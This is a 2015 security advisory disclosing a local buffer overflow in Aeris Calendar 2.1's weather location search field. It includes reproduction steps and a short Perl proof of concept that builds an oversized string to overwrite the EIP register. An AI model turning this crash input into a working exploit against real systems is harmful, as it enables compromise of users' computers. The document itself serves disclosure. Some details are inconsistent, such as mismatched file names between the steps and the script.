Abstract Advisory Information:
==============================
An independent vulnerability laboratory researcher discovered a local buffer overflow web vulnerability in the official Aeris Calandar v2.1 software.


Vulnerability Disclosure Timeline:
==================================
2015-12-01:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Esumsoft
Product: Aeris Calendar - Software 2.1


Exploitation Technique:
=======================
Local


Severity Level:
===============
High


Technical Details & Description:
================================
A local unicode buffer overflow has been discovered in the official Aeris Calandar v2.1 software.
The local vulnerability allows to overwrite the registers of the software process to compromise the target computer system.

The classic buffer overflow vulnerability is located in the software Aeris CaLandar an attacker manipulate the bit EIP register in order to execute 
the next instruction of their choice. Attacker can for example execute arbitrary codes. The attacker includes a large unicode string to overwrite the 
EIP register of the process. Finally the attacker is able to compromise the system process of the active program.

The security risk of the buffer overflow vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.4.
Exploitation of the vulnerability requires a low privilege system user account and no user interaction. Successful exploitation of the local
vulnerability results in system compromise by elevation of privileges via overwrite of the registers (EIP,EBP & ECX Co.).

Vulnerable Module(s):
			[+] Weather -> Set Location > Input <> [Search]


Proof of Concept (PoC):
=======================
The buffer overflow vulnerability can be exploited by local attackers with restricted system user account and without user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the vulnerability ...
1. Launch Aeris Calandar.exe                
2. Click Weather -> Set Location                
3. Copy  the AAAA...+ string from bof.txt to clipboard
4. Paste it the input Enter your city or zip code and press search AAAA....+ string > click Search
5. Software will crash with a BEX exception
6. Successful reproduce of the local buffer overflow vulnerability!

PoC: Perl Exploit (*.pl)

my $Buff = "\x41" x 8186;
my $Buff1 = "\x42" x 4;
my $Buff2 = "\x43" x 4;
open(MYFILE,'>>File.txt');
print MYFILE $Buff.$Buff1.$Buff2;
close(MYFILE);

print " POC Created by ZwX\n";


Solution - Fix & Patch:
=======================
Restrict the input of the location module to prevent local buffer overflows in that same module. 
Setup an specific input size to ensure no overflow occurs during the active search.


Security Risk:
==============
The security risk of the local buffer overflow vulnerability in the calandar software for windows is estimated as high. (CVSS 6.4)
